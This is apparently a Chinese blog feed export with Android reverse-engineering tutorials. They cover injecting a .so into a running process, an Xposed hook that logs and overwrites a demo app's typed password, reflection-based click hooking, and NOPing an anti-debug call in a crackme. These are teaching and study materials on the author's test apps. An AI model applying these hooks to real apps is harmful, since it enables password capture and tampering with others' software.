<p>这个函数，第一个参数是哪个结构体，第二个是当前的pid，第三个是你要hook的so，第四个是导出函数，第五个使我们在之前那个arm文件中实现的函数，最后一个是我们的hook函数。<br>最后我们还是用ndk-build编译那个Android.mk文件，最后会在lib文件加下面生成我们的so文件，当然我们要在之前生成我们的base文件，这个base文件夹是在instruments文件加下面的，同样使用NDK编译。<br>最后我们将我们的这个注入器和so文件导入我们的Android模拟器中。<br><img src="img4.jpg" alt="导入文件"><br>我们在adb中启动我们的注入器，注入器使用规则：<br><code>./hijack -d -p 21846 -l /data/local/tmp/libexample.so</code><br>21846使我们进程的PID，这里我们通过ddms获取，最后一个使我们的so文件，必须绝对路径（最好都给权限，还有那个log文件我们要线程手动生成一个，有没有内容不重要）。<br>可以看到结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mprotect: 0x400421ec</span><br><span class="line">dlopen: 0x40000ef9</span><br><span class="line">pc&#x3D;400433dc lr&#x3D;400b1fb5 sp&#x3D;bec14488 fp&#x3D;bec1461c</span><br><span class="line">r0&#x3D;fffffffc r1&#x3D;bec144a8</span><br><span class="line">r2&#x3D;10 r3&#x3D;1f0</span><br><span class="line">stack: 0xbec00000-0xbec15000 leng &#x3D; 86016</span><br><span class="line">executing injection code at 0xbec14438</span><br><span class="line">calling mprotect</span><br><span class="line">library injection completed!</span><br></pre></td></tr></table></figure>
<p>看到这个之后我们就算是成功了。<br><img src="img5.jpg" alt="成功"><br>使用IDA附加进程，来到我们的encodestr函数：<br><img src="img6.jpg" alt="跳转1"><br><img src="img7.jpg" alt="跳转2"><br>可以看到确实实现了hook。</p>
<h2 id="java层hook"><a href="#java层hook" class="headerlink" title="java层hook"></a>java层hook</h2><p>这里使用到的框架式Xposed这个框架，这个框架使用起来很简单，首先我们需要先安装我们的客户端：<br><img src="img8.jpg" alt="Xposed"><br>安装完毕之后就可以了，当然要给root了，但是这个是可以在X86架构上的，因为是java层的。<br>安装完毕之后我们就需要导入我们的jar包：<br><img src="img9.jpg" alt="jar包"><br>导入这个包之后我们需要配置一下AndroidManifest.xml，需要在<code>application</code>这个节点下面添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:name</span>=<span class="string">"xposedmodule"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:name</span>=<span class="string">"xposeddescription"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:value</span>=<span class="string">"测试服务端"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:name</span>=<span class="string">"xposedminversion"</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:value</span>=<span class="string">"54"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>第一个是表明是xposed的模块，第二个是插件的名称，第三个是你使用的jar包的版本号。<br>声明好这三个节点之后，我们就需要对APK程序进行分析，这里为了方便我就直接用了源代码级别的，我们是要hook用户输入的内容：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.passtest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">OnClickListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> EditText et_username;</span><br><span class="line">	<span class="keyword">public</span> EditText et_password;</span><br><span class="line">	<span class="keyword">public</span> Button btn;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line">		et_username = (EditText) findViewById(R.id.username);</span><br><span class="line">		et_password = (EditText) findViewById(R.id.password);</span><br><span class="line">		</span><br><span class="line">		btn = (Button) findViewById(R.id.soLogin);</span><br><span class="line">		btn.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">		<span class="keyword">case</span> R.id.soLogin:</span><br><span class="line">			<span class="comment">//Toast.makeText(MainActivity.this, "ttttttt", Toast.LENGTH_SHORT).show();</span></span><br><span class="line">			Log.d(<span class="string">"wker"</span>, <span class="string">"aaa"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们的目的就是要获取到用户输入的内容，其实也就是et_password中的内容</p>
<p>分析完毕之后，接下来我们就需要新建一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.androidtestxposed;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMain</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">		Log.v(<span class="string">"packageName"</span>, lpparam.packageName);</span><br><span class="line">		Log.d(<span class="string">"wker1"</span>,lpparam.packageName);</span><br><span class="line">		<span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">"com.example.passtest"</span>))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		Log.d(<span class="string">"wker"</span>,<span class="string">"into"</span>);</span><br><span class="line">		findAndHookMethod(<span class="string">"com.example.passtest.MainActivity"</span>, lpparam.classLoader, <span class="string">"onClick"</span>, View<span class="class">.<span class="keyword">class</span>,<span class="title">new</span> <span class="title">XC_MethodHook</span>() </span>&#123;</span><br><span class="line">			<span class="meta">@Override</span>							</span><br><span class="line">			<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">				<span class="comment">/*Class clazz = param.thisObject.getClass();</span></span><br><span class="line"><span class="comment">				Log.v("wker", clazz.getName());*/</span></span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">				<span class="comment">/*</span></span><br><span class="line"><span class="comment">				TextView tv = (TextView) param.thisObject;</span></span><br><span class="line"><span class="comment">				String text = tv.getText().toString();</span></span><br><span class="line"><span class="comment">				tv.setText(text + " :)");</span></span><br><span class="line"><span class="comment">				tv.setTextColor(Color.RED);</span></span><br><span class="line"><span class="comment">				Log.v("redcolock","redcolock");*/</span></span><br><span class="line">				Class clazz = param.thisObject.getClass();</span><br><span class="line">				Log.v(<span class="string">"wker"</span>, clazz.getName());</span><br><span class="line">				Field field = clazz.getField(<span class="string">"et_password"</span>);</span><br><span class="line">				EditText password = (EditText) field.get(param.thisObject);</span><br><span class="line">				Log.v(<span class="string">"wker"</span>, password.getText().toString());</span><br><span class="line">				<span class="comment">//Toast.makeText((Activity)param.thisObject, password.getText().toString(), Toast.LENGTH_SHORT).show();</span></span><br><span class="line">				password.setText(<span class="string">"ceshi"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先这个类要继承<code>IXposedHookLoadPackage</code>这个接口，并且实现<code>handleLoadPackage</code>方法，这个方法传进来一个<code>LoadPackageParam</code>这个类的一个参数，这个我们是可以获取到包名的，通过<code>packageName</code>这个成员，我们就通过包名来判断是不是我们想要hook的一个程序，不是的话呢返回。<br>判断是我们想要hook的程序之后，我们使用<code>findAndHookMethod</code>这个样子的一个静态方法设置我们想要hook的类：</p>
<ol>
<li>第一个参数是完整的类名</li>
<li>第二个参数是类的加载器。</li>
<li>第三个参数是类中想要hook的方法</li>
<li>第四个参数是hook的方法的参数</li>
<li>最后一个参数是我们new的一个内部类<ul>
<li>内部类可以实现hook的方法。</li>
</ul>
</li>
</ol>
<p>第五个参数：<br><code>beforeHookedMethod</code>实现这个方法是在执行原先函数之前我们需要做的操作，我们这里通过反射获取他的et_password，前两句我们的对象是否正确，发现没问题，第三个是通过我们获取到的这个对象中的成员，然后通过反射获取成员变量，然后最终就可以截获我们输入的密码。<br><code>afterHookedMethod</code>这个方法是hook之后做的一些操作，但是我在测试的过程中发现，我在截取密码的时候，after如果有获取对象操作的时候，我们的操作就会失败befor也会出现错误，我觉的很是奇怪，之后具体分析<br><code>XC_MethodReplacement</code>这个类是可以完全替换我们的函数方法，这里没有测试，之后具体分析，他也是<code>XC_MethodHook</code>（第五个参数的一个子类）。<br><img src="img10.jpg" alt="hook成功"><br>这里发现就可以hook成功了。<br><img src="img12.jpg" alt="log信息"><br>其实我们也可以看到，<code>Class clazz = param.thisObject.getClass();</code>这个获取到的类也就是我们MainActivity这个类！</p>
<h3 id="java层hook的实现原理"><a href="#java层hook的实现原理" class="headerlink" title="java层hook的实现原理"></a>java层hook的实现原理</h3><p>native层的hook和我们在Windows下面的hook道理其实差不多，但是java层的一个hook是通过反射基址进行hook的。</p>
<p>首先我们要确定我们要hook的类和相对应的方法。<br>这里就hook我们的点击事件就好。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">    Button button = (Button) findViewById(R.id.hookClick);</span><br><span class="line">    button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            Log.e(<span class="string">"test"</span>, <span class="string">"点击事件继续"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    TextView tv = (TextView) findViewById(R.id.textView1);</span><br><span class="line">    tv.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">			Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"test"</span>, Toast.LENGTH_SHORT).show();;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br></pre></td></tr></table></figure>
<p>简单的一个点击。<br>想要hook  OnclickListener这个方法。<br>首先我们先要分析这个内部类的一个实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setOnClickListener</span><span class="params">(OnClickListener l)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isClickable()) &#123;</span><br><span class="line">        setClickable(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getListenerInfo().mOnClickListener = l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实这个setOnClickListerner这个方法就是将<code>getListenerInfo()</code>获取到的对象返回回去：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">ListenerInfo <span class="title">getListenerInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mListenerInfo != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> mListenerInfo;</span><br><span class="line">    &#125;</span><br><span class="line">    mListenerInfo = <span class="keyword">new</span> ListenerInfo();</span><br><span class="line">    <span class="keyword">return</span> mListenerInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取到他的对象之后，然后将其中的<code>mOnClickListener</code>变量设置为我们的一个变量，分析到这里就明白了，那么我们就来hook。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method method = View.class.getDeclaredMethod("getListenerInfo");</span><br><span class="line">method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Log.e(<span class="string">"test"</span>, <span class="string">"method="</span> + method.getName());</span><br></pre></td></tr></table></figure>
<p>这一步我们先获取到<code>getListenerInfo</code>这个方法，然后设置这个方法为可更改的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取Button的ListenerInfo对象mListenerInfo</span></span><br><span class="line">Object mListenerInfo = method.invoke(button);</span><br></pre></td></tr></table></figure>
<p>这个就是通过执行<code>getListenerInfo</code>方法来获取到我们原先的一个对象（点击事件的），穿进去的参数是我们的按钮对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 内部类需要使用$分隔</span></span><br><span class="line">Class&lt;?&gt; classListenerInfo = Class.forName(<span class="string">"android.view.View$ListenerInfo"</span>);</span><br><span class="line"><span class="comment">// 获取内部Field mOnClickListener</span></span><br><span class="line">Field field = classListenerInfo.getDeclaredField(<span class="string">"mOnClickListener"</span>);</span><br></pre></td></tr></table></figure>
<p>获取到我们的对象之后我们就需要来获取我们的内部类，我们是需要通过这个内部类来获取到<code>mOnClickListener</code>这个字段的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 然后获取Button的ListenerInfo对象mListenerInfo的mOnClickListener变量</span></span><br><span class="line"><span class="comment">// --这就是真正的拿到了Button的监听回调View.OnClickListener的实例对象</span></span><br><span class="line"><span class="keyword">final</span> View.OnClickListener onClickListener = (View.OnClickListener) field.get(mListenerInfo);</span><br></pre></td></tr></table></figure>
<p>我们获取到内部类中的<code>mOnClickListener</code>字段之后，我们就通过这个字段获取我们真正的对象（也就是我们那个按钮点击监听器的一个对象，匿名内部类），然后将这个对象保存起来。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 然后准备替换为我们自己的点击事件</span></span><br><span class="line"><span class="comment">// 1. 创建代理点击对象，然后替换 (这里继承接口实现一个类也可以)</span></span><br><span class="line">Object proxyOnClickListener = Proxy.newProxyInstance(button.getClass().getClassLoader(),</span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;View.OnClickListener<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line"><span class="class">        <span class="title">new</span> <span class="title">InvocationHandler</span>() </span>&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>,</span><br><span class="line">                        <span class="string">"你点击我嘛，我很烦的！"</span>,</span><br><span class="line">                        Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="comment">// 为了保证其点击逻辑，除了插入我们的操作，我们还是要处理正常的调用逻辑</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(onClickListener, args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p>我们通过动态代理获取一下相对应的一个点击事件，可以看到和我们的xposed框架很相似：</p>
<ol>
<li>第一个参数是我们hook的对象的一个类加载器</li>
<li>第二个是这个方法一个参数</li>
<li>第三个方法就是当执行到这个参数的时候我们想要执行的命令</li>
</ol>
<p>最后一个参数实现<code>invoke</code>方法，这个方法穿进去的第二三个参数比较重要，第二个参数是我们可以通过他获取原先的执行方法，感觉就是反射得到的，传进去我们之前获取到的对象和第三个参数的参数就可以了，然后我们就弹出一个Toast。<br>获取完毕之鸥，我们就替换掉之前的button事件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2. 然后替换掉Button的点击事件</span></span><br><span class="line">field.set(mListenerInfo, proxyOnClickListener);</span><br></pre></td></tr></table></figure>
<p>这样我们就实现了hook点击事件，以此类推，我们也可以hookTextView的一个点击事件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	Method method = View.class.getDeclaredMethod("getListenerInfo");</span><br><span class="line">	method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Object mLObject = method.invoke(tv);</span><br><span class="line">	Class&lt;?&gt; cli = Class.forName(<span class="string">"android.view.View$ListenerInfo"</span>);</span><br><span class="line">	Field fi = cli.getDeclaredField(<span class="string">"mOnClickListener"</span>);</span><br><span class="line">	<span class="keyword">final</span> View.OnClickListener oc = (OnClickListener) fi.get(mLObject);</span><br><span class="line">	</span><br><span class="line">	Object newOnClickListern = Proxy.newProxyInstance(tv.getClass().getClassLoader(),<span class="keyword">new</span> Class[]&#123;View.OnClickListener<span class="class">.<span class="keyword">class</span>&#125;, <span class="title">new</span> <span class="title">InvocationHandler</span>() </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">			 Toast.makeText(MainActivity.<span class="keyword">this</span>,</span><br><span class="line">                     <span class="string">"HOOK"</span>,</span><br><span class="line">                     Toast.LENGTH_SHORT).show();</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">return</span> method.invoke(oc,args);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	fi.set(mLObject, newOnClickListern);</span><br><span class="line">	</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个的话呢和上面的大同小异。<br><img src="img11.jpg" alt="hook实现"></p>
<p>这就是比较简单的Android HOOk操作，一些具体的等待分析！</p>
]]></content>
      <categories>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Android绕过反调试</title>
    <url>/2020/03/30/Android%E7%BB%95%E8%BF%87%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<h1 id="Android反调试"><a href="#Android反调试" class="headerlink" title="Android反调试"></a>Android反调试</h1><p>主要是用来防止IDA进行附加的，主要的方法思路就是，判断自身是否有父进程，判断是否端口被监听，然后通过调用so文件中的线程进行监视，这个线程开启一般JNI_OnLoad中进行开启的。<br>过反调试的话呢，就要把相关的函数进行NOP掉，直接将这几个字节改为00就可以了。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>首先反编译一下：<br><img src="img1.jpg" alt="AndroidManifest.xml"><br>发现自带不可以调试，我们给他增加上：<code>android:debuggable=&quot;true&quot;</code>在application的节点中，然后进行编译，签名，安装。<br>然后打开IDA进行附加：</p>
<ol>
<li>常规的运行服务器，转发端口</li>
<li>然后使用调试模式进行运行：<code>adb shell am start -D -n com.yaotong.crackme/.MainActivity</code><br><img src="img2.jpg" alt="运行"></li>
<li>运行之后，使用IDA进行附加，附加的时候正常操作，但是进去之后我们需要选择一下：<br>在调试器的调试器选项中设置：<br><img src="img3.jpg" alt="调试器选项"><br>我们勾选上在载入动态库的时候断下。</li>
<li>然后点击运行，之后就会不动，这个时候我们用jdb绑定端口（ddms需要打开的情况下使用8700端口），使用命令：<code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code>然后程序就会断下，因为在加载so文件。</li>
<li>然后我们一次运行就查看是否是我们的so被载入，我们的so文件名是：libcrackme.so</li>
<li>当被载入的时候，我们就选择在JNI_OnLoad中进行下段。<br><img src="img4.jpg" alt="断下"></li>
<li>然后我们慢慢运行，直到我们运行至BXL R7的时候，IDA自己就掉了，所以我们可以推断，这个BLX跳转是反调试我们的IDA，这个时候我们就可以使用十六进制修改器修改我们的程序，将这个BLX R7改为00000000<br><img src="img5.jpg" alt="结束调试"></li>
<li>转到十六进制视图，找到这个语句：37 FF 2F E1这四个字节我们就可以在十六进制修改器中修改为00 00 00 00.<br><img src="img6.jpg" alt="修改数据"></li>
<li>然后重新编译。</li>
</ol>
<p>这个时候我们重新安装运行，我们还是用调试模式运行：<code>adb shell am start -D -n com.yaotong.crackme/.MainActivity</code>，应该也不需要了，因为反调试让我们给nop掉了，我们这个时候运行，发现程序正常被IDA附加了。</p>
<h2 id="java分析"><a href="#java分析" class="headerlink" title="java分析"></a>java分析</h2><p>反编译的java伪代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span></span></span><br><span class="line"><span class="class">  <span class="keyword">extends</span> <span class="title">Activity</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> Button btn_submit;</span><br><span class="line">  <span class="keyword">public</span> EditText inputCode;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span></span><br><span class="line">  &#123;</span><br><span class="line">    System.loadLibrary(<span class="string">"crackme"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle paramBundle)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(paramBundle);</span><br><span class="line">    setContentView(<span class="number">2130903040</span>);</span><br><span class="line">    getWindow().setBackgroundDrawableResource(<span class="number">2130837504</span>);</span><br><span class="line">    <span class="keyword">this</span>.inputCode = ((EditText)findViewById(<span class="number">2131099648</span>));</span><br><span class="line">    <span class="keyword">this</span>.btn_submit = ((Button)findViewById(<span class="number">2131099649</span>));</span><br><span class="line">    <span class="keyword">this</span>.btn_submit.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View paramAnonymousView)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        paramAnonymousView = MainActivity.<span class="keyword">this</span>.inputCode.getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.securityCheck(paramAnonymousView))</span><br><span class="line">        &#123;</span><br><span class="line">          paramAnonymousView = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, ResultActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">          MainActivity.<span class="keyword">this</span>.startActivity(paramAnonymousView);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Toast.makeText(MainActivity.<span class="keyword">this</span>.getApplicationContext(), <span class="string">"验证码校验失败"</span>, <span class="number">0</span>).show();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">securityCheck</span><span class="params">(String paramString)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>载入时候的，发现按钮被点击之后，调用了securityCheck这个方法，这是个本地函数，我们在IDA中进行寻找：<br><img src="img7.jpg" alt="check方法"><br>看一下IDA给我们的伪代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">Java_com_yaotong_crackme_MainActivity_securityCheck</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( !byte_B3DF5359 )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">void</span> *, <span class="keyword">void</span> *, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>))unk_B3DF1494)(</span><br><span class="line">      &amp;unk_B3DF5304,</span><br><span class="line">      <span class="number">8</span>,</span><br><span class="line">      &amp;unk_B3DF346B,</span><br><span class="line">      &amp;unk_B3DF3468,</span><br><span class="line">      <span class="number">2</span>,</span><br><span class="line">      <span class="number">7</span>);</span><br><span class="line">    byte_B3DF5359 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !byte_B3DF535A )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">void</span> *, <span class="keyword">void</span> *, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>))unk_B3DF14F4)(</span><br><span class="line">      &amp;unk_B3DF536C,</span><br><span class="line">      <span class="number">25</span>,</span><br><span class="line">      &amp;unk_B3DF3530,</span><br><span class="line">      &amp;unk_B3DF3474,</span><br><span class="line">      <span class="number">3</span>,</span><br><span class="line">      <span class="number">117</span>);</span><br><span class="line">    byte_B3DF535A = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">void</span> *, <span class="keyword">void</span> *))unk_B3DF00D4)(<span class="number">4</span>, &amp;unk_B3DF5304, &amp;unk_B3DF536C);</span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int8 *)(*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)v3 + <span class="number">676</span>))(v3, v4, <span class="number">0</span>);</span><br><span class="line">  v6 = off_B3DF528C;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (<span class="keyword">unsigned</span> __int8)*v6;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != *v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    ++v5;</span><br><span class="line">    v8 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">      <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
